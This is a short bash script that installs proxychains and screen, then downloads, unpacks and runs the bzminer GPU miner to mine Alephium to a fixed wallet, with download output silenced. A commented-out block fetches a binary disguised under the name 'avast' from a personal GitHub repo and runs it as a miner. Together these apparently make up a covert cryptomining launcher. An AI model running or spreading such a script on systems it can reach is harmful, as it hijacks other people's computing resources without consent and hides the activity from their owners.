#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install screen -y

#wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 

#chmod +x avast >/dev/null 2>&1

#./avast -a ALEPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.RIG001


wget https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1 

tar xf bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1

rm -f bzminer_v7.2.5_linux_cuda_tk.tar.gz

chmod +x bzminer >/dev/null 2>&1

./bzminer -a alph -p stratum+tcp://pool.eu.woolypooly.com:3106 -w 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.a --no_watchdog
